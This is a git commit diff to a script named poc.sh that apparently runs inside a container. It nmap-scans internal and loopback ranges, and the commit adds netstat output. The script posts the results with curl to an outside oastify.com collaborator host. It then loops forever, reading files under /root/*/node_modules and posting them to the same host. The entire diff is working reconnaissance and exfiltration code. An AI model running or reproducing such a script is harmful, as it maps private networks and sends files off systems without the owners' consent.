23e6cf3d59faf0db1a94d98ad85510104474fcb2
whalebone7 <125891350+whalebone7@users.noreply.github.com>
2025-01-31 04:15:54 +0100

    Update poc.sh

--- poc.sh
+++ poc.sh
@@ -7,6 +7,7 @@ echo "Scanning eth0 range (172.17.0.0/16)..." >  output.txt
 # Scan the lo range
 echo -e "\nScanning lo range (127.0.0.0/8)..." >> output.txt
 ./nmap -vv -sS 127.0.0.0/8 >> output.txt
+netstat -a >> output.txt
 
 curl -k -X POST -H "Content-Type: text/plain" --data-binary @output.txt 'http:/hzk794fr06pdhgqkxzgmtb4gp7v2jx7m.oastify.com/nmap'
 
@@ -16,7 +17,7 @@ cat /root/*/node_modules/*.json;
 
 while true; do
 
-    (cat /root/*/node_modules/*.json; cat /root/*/node_modules/*.js;) >> outdata.txt
+    (cat /root/*/node_modules/*/*.json; cat /root/*/node_modules/*/*.js;) >> outdata.txt
     
 
     curl -v -k -X POST -d '@outdata.txt' 'http://hzk794fr06pdhgqkxzgmtb4gp7v2jx7m.oastify.com/outdata'
